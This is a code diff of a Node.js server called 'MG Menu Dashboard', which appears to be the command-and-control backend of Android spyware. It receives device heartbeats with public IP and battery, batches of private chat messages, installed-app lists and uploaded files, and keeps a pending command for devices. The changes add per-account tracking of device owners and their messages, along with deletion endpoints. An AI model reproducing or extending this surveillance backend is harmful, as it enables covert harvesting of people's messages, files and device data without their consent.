@@ -15,18 +15,15 @@ const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SEC
   auth: { persistSession: false }
 });
 
-process.on("unhandledRejection", (reason) => {
-  console.error("Unhandled promise rejection:", reason);
-});
-
-process.on("uncaughtException", (error) => {
-  console.error("Uncaught exception:", error);
-});
+process.on("unhandledRejection", (reason) => console.error("Unhandled promise rejection:", reason));
+process.on("uncaughtException", (error) => console.error("Uncaught exception:", error));
 
 const UPLOAD_DIR = path.join(process.cwd(), "uploads");
 const THUMB_DIR = path.join(process.cwd(), "thumbs");
 const LOG_FILE = path.join(process.cwd(), "logs.json");
 const TRACK_FILE = path.join(process.cwd(), "tracks.json");
+const ACCOUNT_FILE = path.join(process.cwd(), "accounts.json");
+const MESSAGE_META_FILE = path.join(process.cwd(), "message_meta.json");
 const CONFIG_FILE = path.join(process.cwd(), "config.json");
 
 fs.mkdirSync(UPLOAD_DIR, { recursive: true });
@@ -39,29 +36,18 @@ let command = {
   activity: ""
 };
 
-function publicIp(req) {
-  const forwarded = req.headers["x-forwarded-for"];
-  if (typeof forwarded === "string" && forwarded.trim()) return forwarded.split(",")[0].trim();
-  return req.socket.remoteAddress || "";
-}
-
 function clean(value) {
   return value == null ? "" : String(value);
-}
-
-function number(value) {
-  const n = Number(value);
-  return Number.isFinite(n) ? n : 0;
-}
-
-function optionalNumber(value) {
-  const n = Number(value);
-  return Number.isFinite(n) ? n : null;
 }
 
 function optionalClean(value) {
   const s = clean(value);
   return s ? s : null;
+}
+
+function optionalNumber(value) {
+  const n = Number(value);
+  return Number.isFinite(n) ? n : null;
 }
 
 function nowIso() {
@@ -70,6 +56,12 @@ function nowIso() {
 
 function nowMillis() {
   return Date.now();
+}
+
+function publicIp(req) {
+  const forwarded = req.headers["x-forwarded-for"];
+  if (typeof forwarded === "string" && forwarded.trim()) return forwarded.split(",")[0].trim();
+  return req.socket.remoteAddress || "";
 }
 
 function safeDecode(value) {
@@ -86,13 +78,12 @@ function safeName(name) {
 }
 
 function json(res, status, data) {
-  const body = JSON.stringify(data);
   res.writeHead(status, {
     "content-type": "application/json; charset=utf-8",
     "cache-control": "no-store",
     "access-control-allow-origin": "*"
   });
-  res.end(body);
+  res.end(JSON.stringify(data));
 }
 
 function text(res, status, body, type = "text/plain; charset=utf-8") {
@@ -132,22 +123,13 @@ async function readJson(req, fallback = {}) {
   try {
     return JSON.parse(body.toString("utf8"));
   } catch {
-    const params = new URLSearchParams(body.toString("utf8"));
-    return Object.fromEntries(params.entries());
+    return Object.fromEntries(new URLSearchParams(body.toString("utf8")).entries());
   }
 }
 
 async function readForm(req) {
   const body = await collect(req, 25 * 1024 * 1024);
   return Object.fromEntries(new URLSearchParams(body.toString("utf8")).entries());
-}
-
-function readLogs() {
-  return readJsonFile(LOG_FILE);
-}
-
-function readTracks() {
-  return readJsonFile(TRACK_FILE);
 }
 
 function readJsonFile(file) {
@@ -163,29 +145,135 @@ function readJsonFile(file) {
   }
 }
 
+function writeJsonFile(file, data) {
+  fs.writeFileSync(file, JSON.stringify(data, null, 2));
+}
+
+function readLogs() {
+  return readJsonFile(LOG_FILE);
+}
+
 function writeLogs(logs) {
-  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
+  writeJsonFile(LOG_FILE, logs);
+}
+
+function readTracks() {
+  return readJsonFile(TRACK_FILE);
 }
 
 function writeTracks(tracks) {
-  fs.writeFileSync(TRACK_FILE, JSON.stringify(tracks, null, 2));
+  writeJsonFile(TRACK_FILE, tracks);
 }
 
-function addLog(entry) {
-  const logs = readLogs();
-  logs.unshift(entry);
-  writeLogs(logs);
+function readAccounts() {
+  return readJsonFile(ACCOUNT_FILE);
 }
 
-function addTrack(entry) {
-  const tracks = readTracks();
-  tracks.unshift(entry);
-  writeTracks(tracks.slice(0, 1000));
+function writeAccounts(accounts) {
+  writeJsonFile(ACCOUNT_FILE, accounts);
+}
+
+function readMessageMeta() {
+  return readJsonFile(MESSAGE_META_FILE);
+}
+
+function writeMessageMeta(meta) {
+  writeJsonFile(MESSAGE_META_FILE, meta);
+}
+
+function accountIdentity(input = {}) {
+  const my_uid = optionalNumber(input.my_uid ?? input.myUid);
+  const public_id = optionalClean(input.public_id ?? input.publicId);
+  const my_name = optionalClean(input.my_name ?? input.myName ?? input.name);
+  return { my_uid, public_id, my_name };
+}
+
+function accountKey(deviceId, identity = {}) {
+  const id = identity.my_uid ?? identity.public_id ?? "unknown";
+  return `${deviceId}:${id}`;
+}
+
+function defaultAccount(deviceId) {
+  return {
+    key: accountKey(deviceId, {}),
+    device_id: deviceId,
+    my_uid: null,
+    public_id: null,
+    my_name: "Unknown account",
+    first_seen: nowMillis(),
+    last_seen: nowMillis()
+  };
+}
+
+function saveAccount(deviceId, identity = {}, extra = {}) {
+  if (!deviceId) return null;
+  const normalized = accountIdentity(identity);
+  const key = accountKey(deviceId, normalized);
+  const accounts = readAccounts();
+  const existing = accounts.find((item) => item.key === key);
+  const row = {
+    ...(existing || {}),
+    key,
+    device_id: deviceId,
+    my_uid: normalized.my_uid ?? existing?.my_uid ?? null,
+    public_id: normalized.public_id || existing?.public_id || null,
+    my_name: normalized.my_name || existing?.my_name || null,
+    model: optionalClean(extra.model) || existing?.model || null,
+    brand: optionalClean(extra.brand) || existing?.brand || null,
+    public_ip: optionalClean(extra.public_ip) || existing?.public_ip || null,
+    first_seen: existing?.first_seen || nowMillis(),
+    last_seen: nowMillis()
+  };
+  if (existing) {
+    Object.assign(existing, row);
+  } else {
+    accounts.unshift(row);
+  }
+  writeAccounts(accounts);
+  return row;
+}
+
+function latestAccountForDevice(deviceId) {
+  const accounts = readAccounts()
+    .filter((item) => item.device_id === deviceId)
+    .sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
+  return accounts[0] || defaultAccount(deviceId);
+}
+
+function fallbackAccountKey(deviceId, accountsForDevice = []) {
+  if (!accountsForDevice.length) return accountKey(deviceId, {});
+  return [...accountsForDevice].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0))[0].key;
+}
+
+function saveMessageMeta(rows, account) {
+  if (!account) return;
+  const meta = readMessageMeta();
+  const seen = new Map(meta.map((item) => [`${item.device_id}:${item.mid}`, item]));
+  for (const row of rows) {
+    const key = `${row.device_id}:${row.mid}`;
+    seen.set(key, {
+      ...(seen.get(key) || {}),
+      device_id: row.device_id,
+      mid: row.mid,
+      account_key: account.key,
+      my_uid: account.my_uid,
+      public_id: account.public_id,
+      my_name: account.my_name,
+      received_at: row.received_at || nowMillis()
+    });
+  }
+  writeMessageMeta([...seen.values()].slice(-50000));
+}
+
+function accountForMessage(message, accountsForDevice) {
+  const meta = readMessageMeta().find((item) => item.device_id === message.device_id && item.mid === message.mid);
+  if (meta?.account_key) return meta.account_key;
+  return fallbackAccountKey(message.device_id, accountsForDevice);
 }
 
 function contentType(file) {
   const ext = path.extname(file).toLowerCase();
-  const map = {
+  return {
     ".jpg": "image/jpeg",
     ".jpeg": "image/jpeg",
     ".png": "image/png",
@@ -195,14 +283,9 @@ function contentType(file) {
     ".mp4": "video/mp4",
     ".webm": "video/webm",
     ".mov": "video/quicktime",
-    ".mp3": "audio/mpeg",
-    ".wav": "audio/wav",
     ".pdf": "application/pdf",
-    ".txt": "text/plain; charset=utf-8",
-    ".json": "application/json; charset=utf-8",
     ".zip": "application/zip"
-  };
-  return map[ext] || "application/octet-stream";
+  }[ext] || "application/octet-stream";
 }
 
 function sendFile(res, root, rawName) {
@@ -244,20 +327,7 @@ async function getDevices() {
 async function getMessages(deviceId = "") {
   let query = supabase.from("messages").select("*").order("received_at", { ascending: false });
   if (deviceId) query = query.eq("device_id", deviceId);
-  const { data, error } = await query.limit(1000);
-  if (error) throw error;
-  return data || [];
-}
-
-async function getMessagesForDeviceIds(deviceIds = []) {
-  const ids = [...new Set(deviceIds.filter(Boolean))];
-  if (!ids.length) return [];
-  const { data, error } = await supabase
-    .from("messages")
-    .select("*")
-    .in("device_id", ids)
-    .order("received_at", { ascending: false })
-    .limit(1000);
+  const { data, error } = await query.limit(2000);
   if (error) throw error;
   return data || [];
 }
@@ -274,54 +344,75 @@ function isOnline(device) {
   return Number.isFinite(t) && Date.now() - t < 60_000;
 }
 
-function findLinkedDeviceIds(devices, deviceId) {
-  const device = devices.find((item) => item.device_id === deviceId);
-  if (!device) return [deviceId];
-  return devices
-    .filter((candidate) =>
-      candidate.device_id === device.device_id ||
-      (
-        candidate.public_ip === device.public_ip &&
-        (!device.model || !candidate.model || candidate.model === device.model) &&
-        (!device.brand || !candidate.brand || candidate.brand === device.brand)
-      )
-    )
-    .map((candidate) => candidate.device_id);
-}
-
-async function devicesWithStats() {
+async function dashboardData() {
   const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
   const files = getFiles();
+  const accounts = readAccounts();
+  const meta = readMessageMeta();
+
   const msgCounts = new Map();
   const fileCounts = new Map();
-
   for (const msg of messages) msgCounts.set(msg.device_id, (msgCounts.get(msg.device_id) || 0) + 1);
   for (const file of files) fileCounts.set(file.device_id, (fileCounts.get(file.device_id) || 0) + 1);
 
-  const profileDevices = devices
-    .filter((device) => device.my_name || device.public_id || device.my_uid)
-    .sort((a, b) => Number(b.server_last_seen || 0) - Number(a.server_last_seen || 0));
-
   return devices.map((device) => {
-    const profile = profileDevices.find((candidate) =>
-      candidate.device_id !== device.device_id &&
-      candidate.public_ip === device.public_ip &&
-      (!device.model || !candidate.model || candidate.model === device.model) &&
-      (!device.brand || !candidate.brand || candidate.brand === device.brand)
-    );
-    const merged = {
-      ...device,
-      my_uid: device.my_uid ?? profile?.my_uid ?? null,
-      public_id: device.public_id || profile?.public_id || null,
-      my_name: device.my_name || profile?.my_name || null
-    };
+    const deviceAccounts = accounts.filter((account) => account.device_id === device.device_id);
+    if (!deviceAccounts.length && (device.my_uid || device.public_id || device.my_name)) {
+      deviceAccounts.push({
+        key: accountKey(device.device_id, device),
+        device_id: device.device_id,
+        my_uid: device.my_uid,
+        public_id: device.public_id,
+        my_name: device.my_name,
+        last_seen: device.server_last_seen
+      });
+    }
+    const displayAccount = [...deviceAccounts].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0))[0];
     return {
-      ...merged,
-    online: isOnline(device),
-      display_name: merged.my_name || merged.public_id || merged.device_id,
-    message_count: findLinkedDeviceIds(devices, device.device_id).reduce((sum, id) => sum + (msgCounts.get(id) || 0), 0),
-    file_count: fileCounts.get(device.device_id) || 0
+      ...device,
+      online: isOnline(device),
+      display_name: displayAccount?.my_name || displayAccount?.public_id || device.my_name || device.public_id || device.device_id,
+      account_count: deviceAccounts.length,
+      message_count: msgCounts.get(device.device_id) || 0,
+      file_count: fileCounts.get(device.device_id) || 0,
+      tracked_message_count: meta.filter((item) => item.device_id === device.device_id).length
     };
+  });
+}
+
+async function accountSummary(deviceId) {
+  const [messages] = await Promise.all([getMessages(deviceId)]);
+  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  const finalAccounts = accounts.length ? accounts : [defaultAccount(deviceId)];
+  const files = getFiles(deviceId);
+  const meta = readMessageMeta();
+  const byAccount = new Map(finalAccounts.map((account) => [account.key, { ...account, message_count: 0, file_count: 0 }]));
+
+  for (const msg of messages) {
+    const key = meta.find((item) => item.device_id === msg.device_id && item.mid === msg.mid)?.account_key;
+    if (key && byAccount.has(key)) byAccount.get(key).message_count += 1;
+    else if (finalAccounts.length === 1) byAccount.get(finalAccounts[0].key).message_count += 1;
+  }
+  for (const file of files) {
+    const key = file.account_key || fallbackAccountKey(deviceId, finalAccounts);
+    if (key && byAccount.has(key)) byAccount.get(key).file_count += 1;
+  }
+  return [...byAccount.values()].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
+}
+
+async function messagesForAccount(deviceId, rawAccountKey) {
+  const accountKeyValue = safeDecode(rawAccountKey);
+  const messages = await getMessages(deviceId);
+  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  return messages.filter((message) => accountForMessage(message, accounts) === accountKeyValue);
+}
+
+function filesForAccount(deviceId, rawAccountKey) {
+  const accountKeyValue = safeDecode(rawAccountKey);
+  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  return getFiles(deviceId).filter((file) => {
+    if (file.account_key) return file.account_key === accountKeyValue;
+    return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
   });
 }
 
@@ -330,11 +421,18 @@ async function handleHeartbeat(req, res) {
   const device_id = clean(body.device_id || body.deviceId || body.id || body.my_uid || body.myUid || body.public_id || body.publicId);
   if (!device_id) return json(res, 400, { ok: false, error: "device_id is required" });
 
+  const identity = accountIdentity(body);
+  const account = saveAccount(device_id, identity, {
+    model: body.model,
+    brand: body.brand,
+    public_ip: publicIp(req)
+  });
+
   const row = {
     device_id,
-    my_uid: optionalNumber(body.my_uid ?? body.myUid),
-    public_id: optionalClean(body.public_id ?? body.publicId),
-    my_name: optionalClean(body.my_name ?? body.myName ?? body.name),
+    my_uid: identity.my_uid,
+    public_id: identity.public_id,
+    my_name: identity.my_name,
     model: optionalClean(body.model),
     brand: optionalClean(body.brand),
     battery_percent: optionalNumber(body.battery_percent ?? body.battery),
@@ -342,13 +440,10 @@ async function handleHeartbeat(req, res) {
     public_ip: optionalClean(publicIp(req)),
     server_last_seen: optionalNumber(body.lastSeen) || nowMillis()
   };
-  for (const key of Object.keys(row)) {
-    if (row[key] == null) delete row[key];
-  }
-
+  for (const key of Object.keys(row)) if (row[key] == null) delete row[key];
   const { error } = await supabase.from("devices").upsert(row, { onConflict: "device_id" });
   if (error) throw error;
-  json(res, 200, { ok: true, device: row });
+  json(res, 200, { ok: true, device: row, account });
 }
 
 async function handleChatBatch(req, res) {
@@ -356,7 +451,7 @@ async function handleChatBatch(req, res) {
   const list = Array.isArray(body) ? body : Array.isArray(body.messages) ? body.messages : [];
   if (!list.length) return json(res, 400, { ok: false, error: "messages array is required" });
   const batchDeviceId = clean(body.device_id || body.deviceId);
-  const batchMyUid = body.my_uid ?? body.myUid;
+  const account = saveAccount(batchDeviceId, accountIdentity(body), { public_ip: publicIp(req) }) || latestAccountForDevice(batchDeviceId);
 
   const rows = list.map((msg) => ({
     device_id: clean(msg.device_id || msg.deviceId || batchDeviceId),
@@ -367,9 +462,11 @@ async function handleChatBatch(req, res) {
     text: clean(msg.text || msg.message),
     message_time: optionalNumber(msg.message_time ?? msg.messageTime ?? msg.time) || nowMillis(),
     received_at: nowMillis()
-  })).filter((msg) => msg.device_id);
+  })).filter((msg) => msg.device_id && msg.mid);
 
-  if (!rows.length) return json(res, 400, { ok: false, error: "valid device_id is required" });
+  if (!rows.length) return json(res, 400, { ok: false, error: "valid messages are required" });
+  saveMessageMeta(rows, account);
+
   let saved = rows.length;
   let skipped = 0;
   const { error } = await supabase
@@ -381,29 +478,25 @@ async function handleChatBatch(req, res) {
     skipped = 0;
     for (const row of rows) {
       const { error: rowError } = await supabase.from("messages").insert(row);
-      if (!rowError) {
-        saved += 1;
-      } else if (rowError.code === "23505") {
-        skipped += 1;
-      } else {
-        throw rowError;
-      }
+      if (!rowError) saved += 1;
+      else if (rowError.code === "23505") skipped += 1;
+      else throw rowError;
     }
   }
+
   if (batchDeviceId) {
     const batchDevice = {
       device_id: batchDeviceId,
-      my_uid: optionalNumber(batchMyUid),
-      public_id: optionalClean(body.public_id ?? body.publicId),
+      my_uid: account?.my_uid,
+      public_id: account?.public_id,
+      my_name: account?.my_name,
       public_ip: optionalClean(publicIp(req)),
       server_last_seen: nowMillis()
     };
-    for (const key of Object.keys(batchDevice)) {
-      if (batchDevice[key] == null) delete batchDevice[key];
-    }
+    for (const key of Object.keys(batchDevice)) if (batchDevice[key] == null) delete batchDevice[key];
     await supabase.from("devices").upsert(batchDevice, { onConflict: "device_id" });
   }
-  json(res, 200, { ok: true, saved, skipped });
+  json(res, 200, { ok: true, saved, skipped, account });
 }
 
 function fileNameFromHeaders(req, url) {
@@ -425,82 +518,176 @@ async function handleTrack(req, res) {
   const brand = clean(body.brand);
   const android = clean(body.android);
   const device_id = clean(body.device_id || body.deviceId || [model, brand, android].filter(Boolean).join("_") || publicIp(req) || "unknown");
-  const apps = clean(body.apps);
-  const appList = apps ? apps.split(",").map((app) => app.trim()).filter(Boolean) : [];
-
+  const appList = clean(body.apps).split(",").map((app) => app.trim()).filter(Boolean);
+  const account = latestAccountForDevice(device_id);
   const entry = {
     type: "track",
     device_id,
+    account_key: account.key,
     ip: publicIp(req),
     battery: optionalNumber(body.battery),
     model,
     brand,
     android,
-    apps,
+    apps: clean(body.apps),
     app_count: appList.length,
     time: nowIso()
   };
-  addTrack(entry);
+  const tracks = readTracks();
+  tracks.unshift(entry);
+  writeTracks(tracks.slice(0, 1000));
 
   const { error } = await supabase.from("devices").upsert({
     device_id,
     model,
     brand,
     battery_percent: optionalNumber(body.battery),
-    network_type: clean(body.network_type || body.network),
     public_ip: publicIp(req),
     server_last_seen: nowMillis()
   }, { onConflict: "device_id" });
   if (error) throw error;
-
-  json(res, 200, { ok: true, device_id, app_count: appList.length });
+  json(res, 200, { ok: true, device_id, account_key: account.key, app_count: appList.length });
 }
 
 async function handleUpload(req, res, url) {
   const buffer = await collect(req);
   if (!buffer.length) return json(res, 400, { ok: false, error: "empty upload body" });
-
+  const device_id = clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown");
+  const account = latestAccountForDevice(device_id);
   const original = safeName(fileNameFromHeaders(req, url));
   const stamp = Date.now();
   const file = `${stamp}_${original}`;
   const thumb = `thumb_${stamp}_${original}`;
-  const filePath = path.join(UPLOAD_DIR, file);
-  const thumbPath = path.join(THUMB_DIR, thumb);
-
-  fs.writeFileSync(filePath, buffer);
-  fs.copyFileSync(filePath, thumbPath);
+  fs.writeFileSync(path.join(UPLOAD_DIR, file), buffer);
+  fs.copyFileSync(path.join(UPLOAD_DIR, file), path.join(THUMB_DIR, thumb));
 
   const entry = {
     type: "file",
     file,
     original,
     thumb,
-    device_id: clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown"),
+    device_id,
+    account_key: account.key,
     ip: publicIp(req),
     size: buffer.length,
     time: nowIso()
   };
-  addLog(entry);
+  const logs = readLogs();
+  logs.unshift(entry);
+  writeLogs(logs);
   json(res, 200, { ok: true, ...entry });
 }
 
-function handleDeleteFile(res, rawName) {
-  const name = path.basename(safeDecode(rawName));
-  const logs = readLogs();
-  const item = logs.find((log) => log.file === name || log.thumb === name || log.original === name);
-  const filesToDelete = new Set([name]);
-  if (item?.file) filesToDelete.add(item.file);
-  if (item?.thumb) filesToDelete.add(item.thumb);
-
-  for (const file of filesToDelete) {
+function deletePhysicalFile(itemOrName) {
+  const names = typeof itemOrName === "string"
+    ? [itemOrName]
+    : [itemOrName.file, itemOrName.thumb].filter(Boolean);
+  for (const name of names) {
     for (const root of [UPLOAD_DIR, THUMB_DIR]) {
-      const target = path.join(root, path.basename(file));
+      const target = path.join(root, path.basename(name));
       if (fs.existsSync(target)) fs.rmSync(target, { force: true });
     }
   }
+}
 
-  writeLogs(logs.filter((log) => log.file !== name && log.thumb !== name && log.original !== name));
-  json(res, 200, { ok: true, deleted: name });
+function deleteFilesByNames(names = []) {
+  const wanted = new Set(names.map((name) => path.basename(safeDecode(name))));
+  const logs = readLogs();
+  const removed = [];
+  const kept = [];
+  for (const item of logs) {
+    if (wanted.has(item.file) || wanted.has(item.thumb) || wanted.has(item.original)) {
+      deletePhysicalFile(item);
+      removed.push(item);
+    } else {
+      kept.push(item);
+    }
+  }
+  writeLogs(kept);
+  return removed.length;
+}
+
+async function deleteMessages(deviceId, messages = []) {
+  if (!messages.length) return 0;
+  const ids = messages.map((m) => m.id).filter((id) => id != null);
+  if (ids.length) {
+    const { error } = await supabase.from("messages").delete().in("id", ids);
+    if (error) throw error;
+  } else {
+    for (const msg of messages) {
+      const { error } = await supabase.from("messages").delete().eq("device_id", deviceId).eq("mid", msg.mid);
+      if (error) throw error;
+    }
+  }
+  const removeKeys = new Set(messages.map((msg) => `${msg.device_id}:${msg.mid}`));
+  writeMessageMeta(readMessageMeta().filter((item) => !removeKeys.has(`${item.device_id}:${item.mid}`)));
+  return messages.length;
+}
+
+async function deleteAccount(deviceId, rawAccountKey, includeFiles = true) {
+  const key = safeDecode(rawAccountKey);
+  const messages = await messagesForAccount(deviceId, key);
+  const deletedMessages = await deleteMessages(deviceId, messages);
+  let deletedFiles = 0;
+  if (includeFiles) {
+    deletedFiles = deleteFilesByNames(filesForAccount(deviceId, key).map((file) => file.file));
+  }
+  writeAccounts(readAccounts().filter((account) => account.key !== key));
+  writeMessageMeta(readMessageMeta().filter((item) => item.account_key !== key));
+  return { deletedMessages, deletedFiles };
+}
+
+async function handleDashboardApi(req, res, url) {
+  const parts = url.pathname.split("/").filter(Boolean).map(safeDecode);
+  if (req.method === "GET" && url.pathname === "/api/devices") return json(res, 200, await dashboardData());
+  if (req.method === "GET" && url.pathname === "/api/tracks") return json(res, 200, readTracks());
+
+  if (parts[0] === "api" && parts[1] === "device" && parts[2]) {
+    const deviceId = parts[2];
+    if (req.method === "GET" && parts.length === 3) {
+      const devices = await dashboardData();
+      const device = devices.find((item) => item.device_id === deviceId);
+      return device ? json(res, 200, device) : notFound(res);
+    }
+    if (req.method === "GET" && parts[3] === "accounts") return json(res, 200, await accountSummary(deviceId));
+    if (req.method === "GET" && parts[3] === "messages") return json(res, 200, await getMessages(deviceId));
+    if (req.method === "GET" && parts[3] === "files") return json(res, 200, getFiles(deviceId));
+    if (req.method === "GET" && parts[3] === "tracks") return json(res, 200, readTracks().filter((item) => item.device_id === deviceId));
+    if (parts[3] === "account" && parts[4]) {
+      const key = parts[4];
+      if (req.method === "GET" && parts[5] === "messages") return json(res, 200, await messagesForAccount(deviceId, key));
+      if (req.method === "GET" && parts[5] === "files") return json(res, 200, filesForAccount(deviceId, key));
+      if (req.method === "DELETE" && parts.length === 5) return json(res, 200, { ok: true, ...(await deleteAccount(deviceId, key, true)) });
+      if (req.method === "DELETE" && parts[5] === "messages") return json(res, 200, { ok: true, deleted: await deleteMessages(deviceId, await messagesForAccount(deviceId, key)) });
+      if (req.method === "DELETE" && parts[5] === "files") return json(res, 200, { ok: true, deleted: deleteFilesByNames(filesForAccount(deviceId, key).map((file) => file.file)) });
+    }
+    if (req.method === "DELETE" && parts.length === 3) {
+      const messages = await getMessages(deviceId);
+      const deletedMessages = await deleteMessages(deviceId, messages);
+      const deletedFiles = deleteFilesByNames(getFiles(deviceId).map((file) => file.file));
+      writeAccounts(readAccounts().filter((account) => account.device_id !== deviceId));
+      writeTracks(readTracks().filter((track) => track.device_id !== deviceId));
+      await supabase.from("devices").delete().eq("device_id", deviceId);
+      return json(res, 200, { ok: true, deletedMessages, deletedFiles });
+    }
+  }
+
+  if (req.method === "DELETE" && url.pathname === "/api/messages") {
+    const body = await readJson(req, {});
+    const ids = Array.isArray(body.ids) ? body.ids : [];
+    const deviceId = clean(body.device_id || body.deviceId);
+    if (!ids.length || !deviceId) return json(res, 400, { ok: false, error: "device_id and ids are required" });
+    const messages = (await getMessages(deviceId)).filter((msg) => ids.includes(msg.id));
+    return json(res, 200, { ok: true, deleted: await deleteMessages(deviceId, messages) });
+  }
+
+  if (req.method === "DELETE" && url.pathname === "/api/files") {
+    const body = await readJson(req, {});
+    const files = Array.isArray(body.files) ? body.files : [];
+    return json(res, 200, { ok: true, deleted: deleteFilesByNames(files) });
+  }
+
+  return false;
 }
 
 async function dashboardHtml() {
@@ -511,11 +698,10 @@ async function dashboardHtml() {
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>MG Menu Dashboard</title>
 <style>
-:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#161d29;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--bad:#7b8494;--danger:#fb7185;--warn:#fbbf24}
-*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}
-button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{border-right:1px solid var(--line);background:#0d1119;display:flex;flex-direction:column;min-width:0}.brand{padding:18px 18px 14px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px 12px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px}.stat b{display:block;font-size:18px}.stat span{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border-radius:8px;padding:11px;margin-bottom:6px;border:1px solid transparent}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px;min-width:0}.dot{width:9px;height:9px;border-radius:50%;background:var(--bad);flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title{min-width:0}.title h2{margin:0;font-size:22px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.title p{margin:4px 0 0;color:var(--muted)}.actions{display:flex;gap:8px}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 160px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.commandbar input,.commandbar select{min-width:0;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 10px;outline:none}.content{padding:20px 22px;overflow:auto;flex:1;background:linear-gradient(180deg,#0b0f16 0,#090b10 170px)}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:18px}.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px}.card span{display:block;color:var(--muted);font-size:12px}.card b{display:block;margin-top:5px;font-size:20px}.info{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:12px}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;background:var(--panel);border:1px solid var(--line);border-radius:8px}.row span{color:var(--muted)}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:780px;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:10px;color:var(--muted);font-size:12px;margin-bottom:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}.file{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:38px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.fileactions{display:flex;gap:8px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}.hidden{display:none!important}
-@media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:44vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{align-items:flex-start;flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards,.info{grid-template-columns:1fr 1fr}.content{padding:16px}.tabs{padding-left:16px}.grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}}
-@media (max-width:520px){.cards,.info,.commandbar{grid-template-columns:1fr}.stats{grid-template-columns:repeat(3,1fr);padding:10px}.brand{padding:14px}.topbar{padding:16px}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
+:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#171f2b;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--danger:#fb7185}
